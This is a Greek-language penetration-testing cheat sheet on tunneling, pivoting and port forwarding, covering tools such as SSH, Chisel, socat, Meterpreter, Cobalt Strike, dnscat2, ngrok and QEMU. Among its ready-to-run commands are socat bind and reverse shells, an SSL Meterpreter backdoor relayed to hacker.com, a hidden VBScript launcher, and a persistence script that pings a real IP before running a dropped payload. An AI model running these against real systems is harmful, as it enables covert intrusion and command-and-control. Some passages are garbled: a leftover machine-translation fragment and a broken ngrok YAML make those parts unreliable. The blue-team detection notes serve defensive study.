# Tunneling και Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Συμβουλή για το Nmap

> [!WARNING]
> Τα **ICMP** και **SYN** scans δεν μπορούν να tunnelled μέσω socks proxies, επομένως πρέπει να **απενεργοποιήσουμε το ping discovery** (`-Pn`) και να καθορίσουμε **TCP scans** (`-sT`) για να λειτουργήσει αυτό.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Γραφική σύνδεση SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Άνοιγμα νέας θύρας στον SSH Server --> Άλλη θύρα
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Τοπική θύρα --> Παραβιασμένος host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Τοπική θύρα --> Παραβιασμένος host (SSH) --> Οπουδήποτε
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Αυτό είναι χρήσιμο για να λαμβάνετε reverse shells από εσωτερικούς hosts μέσω ενός DMZ προς το host σας:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Χρειάζεστε **root και στις δύο συσκευές** (καθώς πρόκειται να δημιουργήσετε νέες διεπαφές) και η διαμόρφωση του sshd πρέπει να επιτρέπει τη σύνδεση ως root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Ενεργοποίηση της προώθησης στην πλευρά του Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ορίστε μια νέα διαδρομή στην πλευρά του client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Ασφάλεια – Terrapin Attack (CVE-2023-48795)**
> Η downgrade attack Terrapin του 2023 μπορεί να επιτρέψει σε έναν man-in-the-middle να παραποιήσει το αρχικό SSH handshake και να inject δεδομένα σε **οποιοδήποτε forwarded channel** ( `-L`, `-R`, `-D` ). Βεβαιωθείτε ότι τόσο ο client όσο και ο server έχουν patched (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ή απενεργοποιήστε ρητά τους ευάλωτους αλγόριθμους `chacha20-poly1305@openssh.com` και `*-etm@openssh.com` στο `sshd_config`/`ssh_config` πριν βασιστείτε σε SSH tunnels.

## SSHUTTLE

Μπορείτε να κάνετε **tunnel** μέσω **ssh** όλο το **traffic** προς ένα **subnetwork** μέσω ενός host.\
Για παράδειγμα, προωθώντας όλο το traffic που κατευθύνεται προς το 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Σύνδεση με ιδιωτικό κλειδί
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Τοπική θύρα --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Ένας άλλος τρόπος:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Ανοίξτε μια θύρα στο teamserver που ακούει σε όλες τις διεπαφές και μπορεί να χρησιμοποιηθεί για **δρομολόγηση της κίνησης μέσω του beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Σε αυτήν την περίπτωση, το **port ανοίγει στο beacon host**, όχι στο Team Server, και η traffic αποστέλλεται στο Team Server και από εκεί στο καθορισμένο host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Σημείωση:

- Το reverse port forward του Beacon έχει σχεδιαστεί για **tunnel traffic προς το Team Server, όχι για relaying μεταξύ μεμονωμένων machines**.
- Το traffic γίνεται **tunnel μέσα στο C2 traffic του Beacon**, συμπεριλαμβανομένων των P2P links.
- **Δεν απαιτούνται Admin privileges** για τη δημιουργία reverse port forwards σε high ports.

### rPort2Port local

> [!WARNING]
> Σε αυτή την περίπτωση, η **θύρα ανοίγει στο beacon host**, όχι στο Team Server, και το **traffic αποστέλλεται στο Cobalt Strike client** (όχι στο Team Server) και από εκεί στον υποδεικνυόμενο host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Πρέπει να ανεβάσετε ένα web file tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα releases του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για client και server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Προώθηση θυρών
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Χρησιμοποιήστε την ίδια έκδοση για agent και proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Δέσμευση και Ακρόαση Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Πρόσβαση στις τοπικές θύρες του Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Το tunnel ξεκινά από το victim.\
Δημιουργείται ένα socks4 proxy στο 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot μέσω **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port μέσω socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter μέσω SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Μπορείτε να παρακάμψετε ένα **proxy χωρίς authentication** εκτελώντας αυτήν τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Σήραγγα SSL Socat

**/bin/sh κονσόλα**

Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: Client και Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Συνδέστε την τοπική θύρα SSH (22) με τη θύρα 443 του attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Είναι σαν μια console έκδοση του PuTTY (οι επιλογές είναι πολύ παρόμοιες με αυτές ενός ssh client).

Καθώς αυτό το binary θα εκτελεστεί στο θύμα και είναι ssh client, πρέπει να ανοίξουμε την ssh service και τη θύρα μας, ώστε να έχουμε reverse connection. Στη συνέχεια, για να προωθήσουμε μια θύρα προσβάσιμη μόνο τοπικά σε μια θύρα στο μηχάνημά μας:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Χρειάζεται να είστε local admin (για οποιαδήποτε θύρα)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Πρέπει να έχετε **RDP access στο σύστημα**.\
Λήψη:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το tool χρησιμοποιεί τα `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για το **tunneling πακέτων μέσω της σύνδεσης RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον υπολογιστή-πελάτη φορτώστε το **`SocksOverRDP-Plugin.dll`** ως εξής:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε να **connect** στον **victim** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`**, και θα πρέπει να λάβουμε ένα **prompt** που θα αναφέρει ότι το **SocksOverRDP plugin είναι enabled** και θα **listen** στη διεύθυνση **127.0.0.1:1080**.

Κάντε **connect** μέσω **RDP** και κάντε upload & execute το binary `SocksOverRDP-Server.exe` στο victim machine:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαίωσε στο μηχάνημά σου (attacker) ότι η θύρα 1080 βρίσκεται σε κατάσταση ακρόασης:
```
netstat -antb | findstr 1080
```
Τώρα μπορείτε να χρησιμοποιήσετε το [**Proxifier**](https://www.proxifier.com/) **για να κάνετε proxy την κίνηση μέσω αυτής της θύρας.**

## Proxify εφαρμογές GUI των Windows

Μπορείτε να κάνετε τις εφαρμογές GUI των Windows να περιηγούνται μέσω ενός proxy χρησιμοποιώντας το [**Proxifier**](https://www.proxifier.com/).\
Στο **Profile -> Proxy Servers** προσθέστε την IP και τη θύρα του SOCKS server.\
Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να κάνετε proxify και τις συνδέσεις προς τις IP που θέλετε να κάνετε proxify.

## Παράκαμψη NTLM proxy

Το εργαλείο που αναφέρθηκε προηγουμένως: **Rpivot**\
Το **OpenVPN** μπορεί επίσης να το παρακάμψει, ορίζοντας αυτές τις επιλογές στο configuration file:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Πραγματοποιεί authentication σε έναν proxy και δεσμεύει τοπικά μια port που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της port.\
Για παράδειγμα, προωθεί την port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Τώρα, αν ρυθμίσετε, για παράδειγμα, την υπηρεσία **SSH** στο victim να ακούει στη θύρα 443, μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του attacker.\
Θα μπορούσατε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443, ενώ ο attacker ακούει στη θύρα 2222.

## YARP

Ένα reverse proxy που δημιουργήθηκε από τη Microsoft. Μπορείτε να το βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Απαιτούνται δικαιώματα Root και στα δύο συστήματα για τη δημιουργία tun adapters και τη διοχέτευση δεδομένων μεταξύ τους μέσω DNS queries.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Η σύνδεση μέσω του tunnel θα είναι πολύ αργή. Μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του tunnel χρησιμοποιώντας:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**

建立ablishes? Need Greek: Δημιουργεί ένα κανάλι C\&C μέσω DNS. Δεν απαιτεί δικαιώματα root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Σε PowerShell**

Μπορείτε να χρησιμοποιήσετε το [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν client του dnscat2 στο PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding με dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Αλλαγή DNS του proxychains

Το Proxychains παρεμβάλλεται στην κλήση `gethostbyname` της libc και διοχετεύει το tcp DNS request μέσω του socks proxy. **Από προεπιλογή**, ο server **DNS** που χρησιμοποιεί το proxychains είναι ο **4.2.2.2** (hardcoded). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε την IP. Αν βρίσκεστε σε **Windows environment**, μπορείτε να ορίσετε την IP του **domain controller**.

## Tunnels σε Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Ο actor Storm-2603 δημιούργησε ένα **dual-channel C2 ("AK47C2")** που κάνει abuse *μόνο* σε εξερχόμενη κίνηση **DNS** και **plain HTTP POST** – δύο πρωτόκολλα που σπάνια αποκλείονται σε εταιρικά δίκτυα.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Δημιουργεί ένα τυχαίο 5-character SessionID (π.χ. `H4T14`).
• Προσθέτει το `1` για *task requests* ή το `2` για *results* και συνενώνει διαφορετικά πεδία (flags, SessionID, όνομα υπολογιστή).
• Κάθε πεδίο είναι **XOR-encrypted με το ASCII key `VHBD@H`**, γίνεται hex-encoded και συνενώνεται με τελείες – ολοκληρώνοντας με το domain που ελέγχει ο attacker:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Τα requests χρησιμοποιούν `DnsQuery()` για εγγραφές **TXT** (και fallback **MG**).
• Όταν η απάντηση ξεπερνά τα 0xFF bytes, το backdoor **fragments** τα δεδομένα σε τμήματα των 63 bytes και εισάγει τους markers:
`s<SessionID>t<TOTAL>p<POS>` ώστε ο C2 server να μπορεί να τα αναδιατάξει.

2. **HTTP mode (AK47HTTP)**
• Δημιουργεί ένα JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Ολόκληρο το blob γίνεται XOR-`VHBD@H` → hex → αποστέλλεται ως το body ενός **`POST /`** με header `Content-Type: text/plain`.
• Η απάντηση ακολουθεί την ίδια κωδικοποίηση και το πεδίο `cmd` εκτελείται με `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Αναζητήστε ασυνήθιστα **TXT queries** των οποίων το πρώτο label είναι μεγάλο hexadecimal και καταλήγουν πάντα σε ένα σπάνιο domain.
• Ένα σταθερό XOR key ακολουθούμενο από ASCII-hex ανιχνεύεται εύκολα με YARA: `6?56484244?484` (`VHBD@H` σε hex).
• Για HTTP, επισημάνετε text/plain POST bodies που αποτελούνται αποκλειστικά από hex και έχουν πολλαπλάσιο των δύο bytes.

{{#note}}
Ολόκληρο το channel χωρά μέσα σε **standard RFC-compliant queries** και διατηρεί κάθε sub-domain label κάτω από 63 bytes, γεγονός που το καθιστά stealthy στα περισσότερα DNS logs.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Απαιτείται Root και στα δύο συστήματα για τη δημιουργία tun adapters και τη διοχέτευση δεδομένων μεταξύ τους μέσω ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **είναι ένα εργαλείο για την έκθεση υπηρεσιών στο Internet με μία εντολή γραμμής εντολών.**\
_Τα URI έκθεσης είναι της μορφής:_ **UID.ngrok.io**

### Εγκατάσταση

- Δημιουργήστε έναν λογαριασμό: https://ngrok.com/signup
- Λήψη client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Είναι επίσης δυνατή η προσθήκη authentication και TLS, αν χρειάζεται._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Έκθεση αρχείων μέσω HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing κλήσεων HTTP

_Χρήσιμο για XSS,SSRF,SSTI ..._\
Απευθείας από το stdout ή στο HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling εσωτερικής υπηρεσίας HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Απλό παράδειγμα configuration του ngrok.yaml

Ανοίγει 3 tunnels:

- 2 TCP
- 1 HTTP με διάθεση static files από το /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Το daemon `cloudflared` μπορεί να δημιουργεί εξερχόμενα tunnels που εκθέτουν **τοπικές υπηρεσίες TCP/UDP** χωρίς να απαιτούν κανόνες εισερχόμενου firewall, χρησιμοποιώντας το edge του Cloudflare ως σημείο συνάντησης. Αυτό είναι ιδιαίτερα χρήσιμο όταν το egress firewall επιτρέπει μόνο HTTPS traffic, αλλά οι εισερχόμενες συνδέσεις είναι αποκλεισμένες.

### Γρήγορο tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Επίμονα tunnels με DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Εκκινήστε το connector:
```bash
cloudflared tunnel run mytunnel
```
Επειδή όλη η κίνηση εξέρχεται από το host **outbound μέσω της θύρας 443**, τα Cloudflared tunnels αποτελούν έναν απλό τρόπο παράκαμψης των ingress ACLs ή των ορίων NAT. Λάβετε υπόψη ότι το binary εκτελείται συνήθως με αυξημένα privileges – χρησιμοποιήστε containers ή το flag `--user` όταν είναι δυνατό.

## FRP (Fast Reverse Proxy)

Το [`frp`](https://github.com/fatedier/frp) είναι ένα reverse-proxy σε Go που συντηρείται ενεργά και υποστηρίζει **TCP, UDP, HTTP/S, SOCKS και P2P NAT-hole-punching**. Από την έκδοση **v0.53.0 (Μάιος 2024)** μπορεί να λειτουργεί ως **SSH Tunnel Gateway**, επιτρέποντας σε ένα target host να δημιουργήσει reverse tunnel χρησιμοποιώντας μόνο τον stock OpenSSH client – χωρίς να απαιτείται επιπλέον binary.

### Κλασικό reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Χρήση της νέας SSH gateway (χωρίς δυαδικό αρχείο frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Η παραπάνω εντολή δημοσιεύει τη θύρα **8080** του θύματος ως **attacker_ip:9000** χωρίς την ανάπτυξη πρόσθετων εργαλείων – ιδανικό για pivoting με living-off-the-land.

## Covert VM-based Tunnels με QEMU

Το user-mode networking του QEMU (`-netdev user`) υποστηρίζει μια επιλογή που ονομάζεται `hostfwd`, η οποία **δεσμεύει μια TCP/UDP θύρα στο *host* και την προωθεί στο *guest***. Όταν το guest εκτελεί έναν πλήρη SSH daemon, ο κανόνας hostfwd σάς παρέχει ένα disposable SSH jump box που βρίσκεται εξ ολοκλήρου μέσα σε ένα ephemeral VM – ιδανικό για την απόκρυψη της C2 κίνησης από το EDR, επειδή όλη η κακόβουλη δραστηριότητα και τα αρχεία παραμένουν στον virtual disk.<sup>[[1]](#references)</sup>

### Γρήγορο one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Η παραπάνω εντολή εκκινεί μια εικόνα **Tiny Core Linux** (`tc.qcow2`) στη RAM.
• Η θύρα **2222/tcp** στον Windows host προωθείται διαφανώς στη **22/tcp** μέσα στο guest.
• Από την οπτική γωνία του attacker, ο στόχος εκθέτει απλώς τη θύρα 2222· όλα τα πακέτα που φτάνουν σε αυτήν διαχειρίζονται από τον SSH server που εκτελείται στο VM.

### Stealthy εκκίνηση μέσω VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Η εκτέλεση του script με `cscript.exe //B update.vbs` διατηρεί το παράθυρο κρυφό.

### Persistence στο guest

Επειδή το Tiny Core είναι stateless, οι attackers συνήθως:

1. Αποθέτουν το payload στο `/opt/123.out`
2. Προσθέτουν στο `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Προσθέτουν τα `home/tc` και `opt` στο `/opt/filetool.lst`, ώστε το payload να συσκευάζεται στο `mydata.tgz` κατά τον τερματισμό λειτουργίας.

